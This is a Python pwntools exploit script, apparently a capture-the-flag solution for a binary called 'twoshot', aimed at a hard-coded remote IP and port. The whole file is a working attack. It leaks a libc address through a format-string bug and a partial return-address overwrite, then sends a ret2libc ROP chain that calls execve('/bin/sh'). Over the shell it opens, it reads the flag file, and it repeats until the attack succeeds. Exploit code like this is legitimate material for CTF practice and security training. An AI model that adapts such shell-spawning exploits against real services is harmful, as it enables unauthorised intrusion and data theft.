#!/usr/bin/python3

from pwn import *

context.log_level = 'info'
context.binary = exe = ELF('./twoshot_patched', checksec=False)
libc = ELF('./libc-2.33.so', checksec=False)

while True:
	# p = process(exe.path)
	p = remote('45.32.110.58', 9997)

	####################################################
	### Stage 1: Jump main again & Leak libc address ###
	####################################################
	pop2 = 0x000000000002ba52 & 0xffff

	payload = b'%17$p'
	payload = payload.ljust(72, b'A')
	payload += p16(pop2)
	p.sendline(payload)

	data = p.recvuntil(b'AAAA', drop=True)
	libc_leak = int(data, 16)
	libc.address = libc_leak - 0x28a52
	log.info("Libc leak: " + hex(libc_leak))
	log.info("Libc base: " + hex(libc.address))

	#################################
	### Stage 2: Conduct ret2libc ###
	#################################
	pop_rdi = 0x0000000000028a55 + libc.address
	pop_rsi = 0x000000000002a4cf + libc.address
	pop_rdx = 0x00000000000c7f32 + libc.address
	payload = b'A'*72
	payload += flat(
		pop_rdi, next(libc.search(b'/bin/sh')),
		pop_rsi, 0,
		pop_rdx, 0,
		libc.sym['execve']
		)
	p.sendline(payload)
	p.sendline(b'cat /home/ctf/flag.txt && exit')
	data = p.recvall()
	if b'KMA' in data:
		print(data[data.find(b'KMA'):])
		exit()
	p.close()
